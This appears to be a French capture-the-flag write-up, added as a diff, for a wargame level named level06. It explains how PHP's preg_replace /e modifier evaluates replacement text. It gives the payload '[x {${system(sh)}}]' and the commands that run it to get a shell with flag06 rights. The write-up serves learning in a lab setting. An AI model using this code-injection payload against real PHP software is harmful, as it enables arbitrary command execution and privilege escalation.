@@ -1,0 +1,33 @@
+On fait un cat de level06.php et on voit:
+ “ $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); ”
+
+Dans le preg_replace, l’option /e permet d’executer la chaine de remplacement une fois la substitution normale effectuée. Donc c’est la qu’est l’exploit.
+
+Il faut créer un fichier qui contient une chaine de caractère qui va matcher avec la regex "/(\[x (.*)\])/e"
+Donc [x BONJOUR] va matcher
+
+
+La partie qui est executée est : y(\”\\2\”), et donc si on réutilise [x BONJOUR] la partie exec sera y(”BONJOUR”).
+
+Et la il faut trouver comment faire pour executer du code dans une string (car comme on peut le voir BONJOUR est entourré de guillemets)
+
+Et la, après environ 15896 années de recherches on tombe sur ca:
+http://php.net/manual/en/language.types.string.php#language.types.string.parsing.complex
+
+Et plus particulièrement cette ligne :
+"This is the value of the var named by the return value of getName(): {${getName()}}";
+
+
+
+Voila on a plus qu’a utiliser ce qu’on a trouvé, par exemple si on pouvait lancer un shell ca sera parfait … :D
+
+La ligne qu’on veut faire matcher a preg_replace devient donc : [x {${system(sh)}}]
+
+
+EN RESUME:
+
+echo '[x {${system(sh)}}]' > /tmp/hax
+./level06 /tmp/hax lol
+
+Et ensuite on est dans un shell avec les droit flag06 donc on peut faire getflag
+
